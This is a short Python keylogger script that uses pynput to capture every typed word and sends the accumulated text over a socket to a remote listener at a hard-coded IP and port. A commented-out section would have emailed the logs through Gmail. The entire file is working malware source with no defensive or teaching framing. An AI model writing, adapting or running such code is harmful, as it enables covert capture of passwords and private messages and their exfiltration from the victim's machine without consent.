import getpass
import socket
import smtplib
import ssl
from pynput.keyboard import Key, Listener
bad_keys=[
    Key.alt, Key.cmd, Key.ctrl, Key.down, Key.end,Key.f1,Key.f10,Key.f11,Key.f12,Key.f13,Key.f14,Key.f15,Key.f16,Key.f17,Key.f18,Key.f19,Key.f2,Key.f20,Key.f3,Key.f4,Key.f5,Key.f6,Key.f7,Key.f8,Key.f9,Key.home,Key.insert,Key.left,Key.menu,Key.pause,Key.right,Key.shift,Key.tab,Key.up
    ]
#clientSocket=socket.socket(socket.AF_INET, socket.SOCK_STREAM);
REMOTE_HOST = '192.168.1.163' # '106.215.56.95'
REMOTE_PORT = 8801 # 2222
client = socket.socket()
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

# email=input("DOnt enter email: ")
# password=getpass.getpass(prompt="Dont enter password: ", stream =None)
# server =smtplib.SMTP_SSL('smtp.gmail.com', 456, context=ssl.create_default_context())
# server.login(email, password)

full_log=''
word=''
email_char_limit=2

def Press(key):
    global email, full_log, word, email_char_limit
    if key in bad_keys:
        pass
    elif key==Key.space or key==Key.enter:
        word+=' '
        full_log+=word
        word=''
        if len(full_log)>=email_char_limit:
            msg(full_log)
            full_log=''
    elif key==Key.backspace:
        word=word[:-1]
    else: 
        char=f'{key}'
        char=char[1:-1] #Dk wut this do
        word+=char

    if key==Key.esc:
        return False
    
def msg(full_log):
    global client
    #server.sendmail(email, email, full_log)
    
    client.send(full_log.encode())


with Listener(on_press=Press) as listener:
    listener.join()
